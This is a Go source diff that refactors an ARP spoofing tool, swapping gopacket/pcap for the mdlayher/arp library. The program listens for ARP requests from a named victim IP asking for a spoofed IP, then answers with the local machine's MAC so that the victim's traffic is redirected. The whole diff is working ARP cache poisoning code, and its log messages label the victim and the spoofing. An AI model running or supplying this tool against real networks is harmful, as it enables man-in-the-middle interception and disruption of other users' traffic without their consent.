@@ -1,151 +1,95 @@
 package main
 
 import (
-	"errors"
 	"fmt"
 	"net"
+	"net/netip"
 	"os"
 
-	"github.com/google/gopacket"
-	"github.com/google/gopacket/layers"
-	"github.com/google/gopacket/pcap"
+	"github.com/mdlayher/arp"
 )
 
-const (
-	macAddrLen = 6
-	ipAddrLen  = 4
-	snapLen    = 1600
-)
+const macAddrLen = 6
 
-func getLocalMACIP(ifname string) (net.HardwareAddr, net.IP, error) {
+func getInterface(ifname string) (*net.Interface, netip.Addr, error) {
 	iface, err := net.InterfaceByName(ifname)
 	if err != nil {
-		return nil, nil, err
+		return nil, netip.Addr{}, err
 	}
 	if len(iface.HardwareAddr) != macAddrLen {
-		return nil, nil, fmt.Errorf("invalid MAC address for %s", ifname)
+		return nil, netip.Addr{}, fmt.Errorf("invalid MAC address for %s", ifname)
 	}
 
 	addrs, err := iface.Addrs()
 	if err != nil {
-		return nil, nil, err
+		return nil, netip.Addr{}, err
 	}
 	for _, addr := range addrs {
-		var ip net.IP
-		switch v := addr.(type) {
-		case *net.IPNet:
-			ip = v.IP
-		case *net.IPAddr:
-			ip = v.IP
+		prefix, err := netip.ParsePrefix(addr.String())
+		if err != nil {
+			continue
 		}
-		if ip4 := ip.To4(); ip4 != nil {
-			return iface.HardwareAddr, ip4, nil
+		if ip := prefix.Addr(); ip.Is4() {
+			return iface, ip, nil
 		}
 	}
 
-	return nil, nil, fmt.Errorf("no IPv4 address found for %s", ifname)
+	return nil, netip.Addr{}, fmt.Errorf("no IPv4 address found for %s", ifname)
 }
 
-func parseIPv4(s string) (net.IP, error) {
-	ip := net.ParseIP(s).To4()
-	if ip == nil {
-		return nil, fmt.Errorf("invalid IPv4 address: %s", s)
+func parseIPv4(s string) (netip.Addr, error) {
+	ip, err := netip.ParseAddr(s)
+	if err != nil || !ip.Is4() {
+		return netip.Addr{}, fmt.Errorf("invalid IPv4 address: %s", s)
 	}
 	return ip, nil
 }
 
-func sendARPReply(handle *pcap.Handle, senderMAC net.HardwareAddr, senderIP net.IP, targetMAC net.HardwareAddr, targetIP net.IP) error {
-	eth := &layers.Ethernet{
-		SrcMAC:       senderMAC,
-		DstMAC:       targetMAC,
-		EthernetType: layers.EthernetTypeARP,
-	}
-	arp := &layers.ARP{
-		AddrType:          layers.LinkTypeEthernet,
-		Protocol:          layers.EthernetTypeIPv4,
-		HwAddressSize:     macAddrLen,
-		ProtAddressSize:   ipAddrLen,
-		Operation:         layers.ARPReply,
-		SourceHwAddress:   []byte(senderMAC),
-		SourceProtAddress: []byte(senderIP.To4()),
-		DstHwAddress:      []byte(targetMAC),
-		DstProtAddress:    []byte(targetIP.To4()),
-	}
-
-	buf := gopacket.NewSerializeBuffer()
-	if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true}, eth, arp); err != nil {
-		return err
-	}
-	if err := handle.WritePacketData(buf.Bytes()); err != nil {
-		return err
-	}
-
-	fmt.Printf("[+] Sent ARP reply: %s is at %s\n", senderIP, senderMAC)
-	return nil
-}
-
 func run(ifname, victimIPStr, spoofedIPStr string) error {
-	myMAC, myIP, err := getLocalMACIP(ifname)
+	iface, myIP, err := getInterface(ifname)
 	if err != nil {
 		return fmt.Errorf("failed to get local MAC/IP for %s: %w", ifname, err)
 	}
 
 	victimIP, err := parseIPv4(victimIPStr)
 	if err != nil {
-		return errors.New("invalid victim IP: " + victimIPStr)
+		return err
 	}
 	spoofedIP, err := parseIPv4(spoofedIPStr)
 	if err != nil {
-		return errors.New("invalid spoofed IP: " + spoofedIPStr)
+		return err
 	}
 
-	fmt.Printf("[*] Local MAC: %s\n", myMAC)
-	fmt.Printf("[*] Local IP : %s\n", myIP)
-	fmt.Printf("[*] Spoofing: %s claims to be %s\n", victimIPStr, spoofedIPStr)
-
-	handle, err := pcap.OpenLive(ifname, snapLen, false, pcap.BlockForever)
+	client, err := arp.Dial(iface)
 	if err != nil {
-		return fmt.Errorf("pcap open %s: %w\nHint: run as root or with CAP_NET_RAW/CAP_NET_ADMIN", ifname, err)
+		return fmt.Errorf("arp dial %s: %w\nHint: run as root or with CAP_NET_RAW", ifname, err)
 	}
-	defer handle.Close()
+	defer client.Close()
 
-	if err := handle.SetBPFFilter("arp"); err != nil {
-		return fmt.Errorf("set BPF filter: %w", err)
-	}
-
+	fmt.Printf("[*] Local MAC: %s\n", iface.HardwareAddr)
+	fmt.Printf("[*] Local IP : %s\n", myIP)
+	fmt.Printf("[*] Spoofing: %s claims to be %s\n", victimIP, spoofedIP)
 	fmt.Printf("[*] Listening for ARP requests on %s...\n", ifname)
 
-	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for {
-		packet, err := packetSource.NextPacket()
+		packet, _, err := client.Read()
 		if err != nil {
-			return fmt.Errorf("read packet: %w", err)
+			return fmt.Errorf("read ARP packet: %w", err)
 		}
-
-		arpLayer := packet.Layer(layers.LayerTypeARP)
-		if arpLayer == nil {
+		if packet.Operation != arp.OperationRequest {
+			continue
+		}
+		if packet.SenderIP != victimIP || packet.TargetIP != spoofedIP {
 			continue
 		}
 
-		arp, ok := arpLayer.(*layers.ARP)
-		if !ok || arp.Operation != layers.ARPRequest {
-			continue
-		}
-		if !net.IP(arp.DstProtAddress).Equal(spoofedIP) {
-			continue
-		}
-		if !net.IP(arp.SourceProtAddress).Equal(victimIP) {
-			continue
-		}
+		fmt.Printf("[>] Caught ARP request for %s from %s / %s\n", spoofedIP, packet.SenderIP, packet.SenderHardwareAddr)
 
-		senderMAC := net.HardwareAddr(append([]byte(nil), arp.SourceHwAddress...))
-		senderIP := net.IP(append([]byte(nil), arp.SourceProtAddress...))
-
-		fmt.Printf("[>] Caught ARP request for %s from %s / %s\n", spoofedIP, senderIP, senderMAC)
-
-		if err := sendARPReply(handle, myMAC, spoofedIP, senderMAC, senderIP); err != nil {
+		if err := client.Reply(packet, iface.HardwareAddr, spoofedIP); err != nil {
 			fmt.Fprintf(os.Stderr, "send ARP reply: %v\n", err)
+			continue
 		}
+		fmt.Printf("[+] Sent ARP reply: %s is at %s\n", spoofedIP, iface.HardwareAddr)
 	}
 }
 
